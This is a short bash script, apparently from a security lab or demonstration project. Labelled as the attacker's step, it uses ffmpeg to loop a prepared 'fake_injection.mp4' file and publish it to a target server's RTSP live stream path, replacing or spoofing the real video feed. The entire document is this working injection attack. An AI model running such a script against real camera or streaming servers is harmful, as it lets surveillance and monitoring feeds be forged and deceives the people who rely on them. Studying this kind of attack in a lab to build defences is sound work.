#!/usr/bin/env bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="${SCRIPT_DIR}/../.env"
VIDEO_DIR="${SCRIPT_DIR}/../video"
if [ -f "$ENV_FILE" ]; then set -a; . "$ENV_FILE"; set +a; fi

SERVER_IP="${SERVER_IP:?Set SERVER_IP in .env}"
RTSP_PORT="${RTSP_PORT:-8554}"
FAKE_FILE="$VIDEO_DIR/fake_injection.mp4"

if [ ! -f "$FAKE_FILE" ]; then
  echo "Fake video not found: $FAKE_FILE"
  exit 1
fi

echo "[ATTACKER] Injecting fake video to rtsp://$SERVER_IP:$RTSP_PORT/live.sdp"
exec ffmpeg -re -stream_loop -1 -i "$FAKE_FILE" -c copy -f rtsp "rtsp://${SERVER_IP}:${RTSP_PORT}/live.sdp"
